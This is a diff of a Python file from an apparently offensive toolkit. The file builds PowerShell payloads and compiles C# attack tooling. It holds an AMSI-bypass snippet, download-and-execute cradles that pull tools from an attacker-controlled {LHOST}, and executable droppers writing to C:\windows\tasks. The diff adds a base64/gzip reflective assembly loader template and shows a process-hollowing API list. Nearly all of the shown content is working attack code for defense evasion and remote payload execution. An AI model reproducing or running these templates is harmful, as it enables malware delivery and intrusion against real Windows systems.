@@ -1,6 +1,5 @@
 import base64
 import netifaces as ni
-import os
 import subprocess
 import sys
 import yaml
@@ -28,6 +27,7 @@ STAGER_URL = WEBROOT_URL + SHELLCODE_FN
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
 PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
 PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_namespace}.{tool_classname}]::{entrypoint}({cmd})'''
+PS_REFLECTIVE_B64GZ = '''$c=[System.Convert]::FromBase64String('{b64_payload}');$ms=New-Object System.IO.MemoryStream;$ms.Write($c,0,$c.Length);$ms.Seek(0,[System.IO.SeekOrigin]::Begin)|Out-Null;$gzs=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);$d=New-Object System.IO.MemoryStream;$gzs.CopyTo($d);$gzs.Close();$ms.Close();$dB=$d.ToArray();$d.Close();[System.Reflection.Assembly]::Load($dB);[{tool_namespace}.{tool_classname}]::{entrypoint}({cmd})'''
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
 PS_EXE_DL = "wget http://{LHOST}/{tool} -o t.exe;.\\t.exe {cmd}"
@@ -609,7 +609,7 @@ if (retval) {{
 }}
 """
 
-import_choices_pinvoke_import = {
+import_choices_syscall_import = {
   'hollow': ["CreateProcess",
              "ZwQueryInformationProcess",
              "ReadProcessMemory",
@@ -753,4 +753,10 @@ def write_file(filename, content):
 def cs_compile(filename, flags=""):
   cmd = f"mcs {flags} {filename}"
   print("Compiling source file " + filename)
-  os.system(cmd)
+  output = subprocess.check_output(cmd, shell=True)
+
+  if b'Compilation succeeded' in output:
+    return True
+  else:
+    return False
+
